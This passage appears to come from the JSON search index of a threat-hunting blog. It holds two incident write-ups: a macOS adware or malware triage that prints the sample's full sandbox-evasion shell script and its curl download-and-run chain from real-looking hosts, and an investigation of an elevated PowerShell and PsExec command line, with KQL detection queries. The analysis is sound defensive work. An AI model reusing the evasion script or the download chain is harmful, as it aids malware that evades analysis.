&quot;manufacturer&quot;|grep -v &quot;Apple&quot;&amp;gt;/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e &quot;Manufacturer&quot; -e &quot;Vendor Name&quot;|grep -qi &quot;${VM_LIST}&quot;;};is_hw_data_vm(){ system_profiler SPHardwareDataType 2&amp;gt;&amp;amp;1 /dev/null|grep -e &quot;Model Identifier&quot;|grep -qi &quot;${VM_LIST}&quot;;};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&amp;amp;&amp;amp;echo 1||echo 0;};main &quot;${@}&quot;&#39;On closer inspection and a bit of unwrapping, it looks a lot like this helpexecd is trying to figure out if it’s running in a sandbox.It checks for what hardware it’s running on, good indication of sandbox evasion./bin/sh -c &#39;readonly VM_LIST=&quot;VirtualBox\\|Oracle\\|VMware\\|Parallels\\|qemu&quot;;is_hwmodel_vm(){ ! sysctl -n hw.model|grep &quot;Mac&quot;&amp;gt;/dev/null;};is_ram_vm(){ (($(($(sysctl -n hw.memsize)/ 1073741824))&amp;lt;4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo &quot;${ ped}&quot;|grep -e &quot;board-id&quot; -e &quot;product-name&quot; -e &quot;model&quot;|grep -qi &quot;${ VM_LIST}&quot;||echo &quot;${ ped}&quot;|grep &quot;manufacturer&quot;|grep -v &quot;Apple&quot;&amp;gt;/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e &quot;Manufacturer&quot; -e &quot;Vendor Name&quot;|grep -qi &quot;${ VM_LIST}&quot;;};is_hw_data_vm(){ system_profiler SPHardwareDataType 2&amp;gt;&amp;amp;1 /dev/null|grep -e &quot;Model Identifier&quot;|grep -qi &quot;${ VM_LIST}&quot;;};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&amp;amp;&amp;amp;echo 1||echo 0;};main &quot;${ @}&quot;&#39;Flowchart%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD;kernel_task --&amp;gt; launchd;launchd --&amp;gt; xpcproxy;xpcproxy --&amp;gt; |run| apadecoded;apadecoded --&amp;gt; 451CEB63-C438-40C3-899F-0BE4F425F074;apadecoded --&amp;gt; |run| DFBDC5FD-3F69-472A-832B-C8C394560BC4;apadecoded --&amp;gt; AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09;451CEB63-C438-40C3-899F-0BE4F425F074 --&amp;gt; curl;DFBDC5FD-3F69-472A-832B-C8C394560BC4 --&amp;gt; |run| curl;AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09 --&amp;gt; curl;curl --&amp;gt; cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz;cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&amp;gt; |download| 89.187.162.142;cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --&amp;gt; |download| 89.187.162.134;89.187.162.142 --&amp;gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz;89.187.162.134 --&amp;gt; |download| /private/var/tmp/helpexecd/helpexecd.tgz;/private/var/tmp/helpexecd/helpexecd.tgz --&amp;gt; |extract &amp;amp;&amp;amp; run| helpexecd;helpexecd --&amp;gt; 35.160.226.50;helpexecd --&amp;gt; 34.217.226.241;style apadecoded stroke-dasharray: 88.5 44style helpexecd stroke-dasharray: 88.5 44Hunting deeperWe have so far focused on one process, but here is a list of a lot more of them.All of them do the exact same things, which really makes me think that his could be real malware, how exciting. canonistical noble odontolite intrinsicalness TestDate SysUpdater leam recommitment TestDateDaemon apadecode apadecodedI now turned to Virustotal to see what they have to say about this.Once again with focus on one process apadecodedon VT I get a lot of Adware chatter, which in my opinion of course could be true. But some also classify this as outright malware.It is always difficult to know when to stop an investigation, I would love to analyse this more in a sandbox, but since we usually only have Windows Sandboxes, and I have no patience to build a mac one, let’s stop this here.I think we have enough indicators anywayVerdict Indicator Thoughts Verdict Process starts strangely named Processes Maybe a kind of obfuscation? +20% “Obfuscated” process downloads additional code Very likely bad behaviour +20% Newly downloaded code is checks hardware it is running on (sandbox evasion) Sandbox evasion is often a bad sign +20% Many processes doing exactly the same Once again, this looks like something done to confuse the defender +20% Virustotal results in Adware or Malware Honestly, it could be Adware, but I will treat as Malware +20% Verdict: True PositiveNext StepsReinstall that machine, no patience for cleaning such a mess" }, { "title": "Powershell and PSExec", "url": "/posts/Powershell-PSexec/", "categories": "Hunting, MDE", "tags": "mde, hunting, psexec, false positive", "date": "2022-05-17 21:39:00 +0200", "snippet": "Today we investigate some strange behaviour from a (possibly user) executed Powershell session.The AlertEverything started with an explorer.exe running the following commandline.&quot;cmd.exe&quot; /c echo|set/p=&quot;C:\\Temp\\Tools&quot;|powershell -NoP -W 1 -NonI -NoL &quot;SaPs &#39;cmd&#39; -Args &#39;/c &quot;&quot;&quot;cd /d&#39;,$([char]34+$Input+[char]34),&#39;^&amp;amp;^&amp;amp; start /b cmd.exe&quot;&quot;&quot;&#39; -Verb RunAs&quot;When explorer.exe starts something, this usually means that a user started this with a run command.However, as there are ways to obfuscate this by for example running cmd likethis explorer.exe /root,&quot;C:\\Windows\\System32\\cmd.exe&quot;Let’s first inspect the commandline though, it seems to switch the execution path to C:\\Temp\\Tools and elevate toadministrative rights.I always like to first get a handle on the parameters used to run powershell. Parameter Parameter Full Explanation -NoP -NoProfile Who would do that? Doesn’t really have a negative impact though -W 1 -WindowStyle 1 Strange param because usually one would see “Normal, Minimized, Maximized or Hidden” no numbers -NonI -NonInteractive Makes the session non interactive, which is of course interesting -NoL -NoLogo Removes the Logo of session, no real impact The -W 1 param is definitely fancy for me, usually one would expect -W Hidden, but it seems like itaccomplishes the same job.So far my verdict is, the user executed this process, which makes it more or less legitimate, but the params arestrange, so I cannot say a direct false or true positive right now.Because of this, we need to dig deeper.Hunting deeperIn MDE we can also see the following alerts:But there is exactly no information on why MDE thinks that there is suspicious discovery going on.Because of this I decided to check if there were new processes spawned after the admin cmd.exe via advanced hunting.For this we take the PID and timeframe of execution and of course the device the execution happened on.Example script:let pid = &quot;1234&quot;;let device = &quot;mydevice&quot;;let time_span = datetime(2022-01-01T00:00:00);DeviceProcessEvents| where Timestamp between (time_span .. (time_span + 1d))| where DeviceName contains device| where ProcessId == pid or InitiatingProcessId == pid| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessCommandLine, ProcessId, InitiatingProcessId, InitiatingProcessParentId, ReportId| order by Timestamp ascThis in the end gave me some interesting results.We can see (in green) the parent process cmd.exe spawned two sub processes, once again cmd.exe and oneconhost.exe 0xffffffff -ForceV1 we will get back to conhost.exe laterOf course now I wanted to get an understanding of if this new cmd.exe started something, so I adjusted my hunting queryand tried again with this result:PsExecThe executed PsExec commands:PsExec.exe \\\\mydevice -accepteula -nobanner -s cmd /c powershell.exe -noninteractive -command &quot;&amp;amp;{Get-MPComputerStatus | Select-Object -Property AntispywareEnabled, AntivirusEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled}&quot;PsExec.exe \\\\mydevice -accepteula -nobanner -s cmd /c powershell.exe -noninteractive -command &quot;&amp;amp;{Get-MPComputerStatus | Select-Object -Property AMServiceEnabled, AntispywareEnabled, AntispywareSignatureLastUpdated, AntivirusEnabled, AntivirusSignatureLastUpdated, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, NISSignatureLastUpdated, OnAccessProtectionEnabled, RealTimeProtectionEnabled, TamperProtectionSource}&quot;Now we are getting somewhere, PSExec was executed, why this was not mentioned in the alert is beyond me. Goes to showthat you should not just blindly trust MDE to do its job.But it definitely explains the “suspicious discovery” which MDE was talking about.Reading the commands used is quite easy, someone is trying to get information about the security status of this device.Let’s be honest, if an attacker already is admin, there is no need to use noisy tools like PsExec which every EDR onearth notices.So far the flow of process looks a bit like this:%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD; ex[explorer.exeRunning in user context]; cmd1[cmd.exeRunning in user context]; ps1[powershell.exeRunning in user context]; cmd2[cmd.exeRunning in admin context]; conhost[conhost.exe]; cmd3[cmd.exeRunning in admin context]; PSExec[PSExec.exe]; PSExec2[PSExec.exe]; ex --&amp;gt; cmd1; cmd1 --&amp;gt; ps1; ps1 --&amp;gt; cmd2; cmd2 --&amp;gt; cmd3; cmd2 --&amp;gt; conhost; cmd3 --&amp;gt; PSExec; cmd3 --&amp;gt; PSExec2;conhost.exeAnd what about conhost.exe 0xffffffff -ForceV1?I did a bit of research about it and came to no intelligent conclusion whatsoever.Hausec has a good writeup on cobalt strike which hassimilar behaviour. I had a closer look into this and came across a post instrontic about thistopic which brought me tothisSigma rule.I took the Sigma rule and converted it to KQL with uncoder:DeviceProcessEvents| where ( (ProcessCommandLine contains @&quot;\\cmd.exe /C whoami&quot; and InitiatingProcessFolderPath startswith @&quot;C:\\Temp&quot;) or ( ProcessCommandLine contains &quot;conhost.exe 0xffffffff -ForceV1&quot; and ( InitiatingProcessCommandLine contains &quot;/C whoami&quot; or InitiatingProcessCommandLine contains &quot;cmd.exe /C echo&quot; or InitiatingProcessCommandLine contains @&quot; &amp;gt; \\\\\\\\.\\\\pipe&quot; ) ) or ( ( ProcessCommandLine contains &quot;cmd.exe /c echo&quot; or ProcessCommandLine contains @&quot;&amp;gt; \\\\\\\\.\\\\pipe&quot; or ProcessCommandLine contains @&quot;\\whoami.exe&quot; ) and InitiatingProcessFolderPath endswith @&quot;\\dllhost.exe&quot; ) or ( FolderPath endswith @&quot;\\cmd.exe&quot; and InitiatingProcessFolderPath endswith @&quot;\\runonce.exe&quot; and InitiatingProcessCommandLine endswith @&quot;\\runonce.exe&quot; ) )| distinct DeviceName, ProcessCommandLine,InitiatingProcessCommandLine,FolderPath,InitiatingProcessFolderPathRunning this against our environment, focused on our specific device, I was unable to find any traces, which makes memore or less certain that this has nothing to do with cobalt strike in our case.Privilege EscalationNow knowing the full path of what happened, I had another look into the “privilege escalation” aspect.The logged-in user went from user to administrator, however as far as I was able to check via UAC, so all is in order.This and the understanding of what was happening, made me feel certain enough of what happened, which enables me to getin touch with the user.The user was able to confirm that they are debugging some issues with the installed endpoint protection which fittedinto my view of the matter.Verdict Indicator Thoughts Verdict CMD started by User Either compromise of host, or legitimate action by user -10% Powershell started with odd parameters The parameters looks pretty malicious / suspicious +90% Elevation of Privileges via UAC This is very normal behaviour and would indicate that someone has access to both user and admin passwords, unlikely -10% Running of PsExec PsExec is often used for malicious behaviour, but in this case local execution as admin makes no actual sense -10% Explanation by user The Explanation of the user made sense and fit into my perspective of how the alert played out -100% Verdict: False PositiveNext StepsGet better processes, it’s no good to use PSExec on a business device in my opinion" } ]
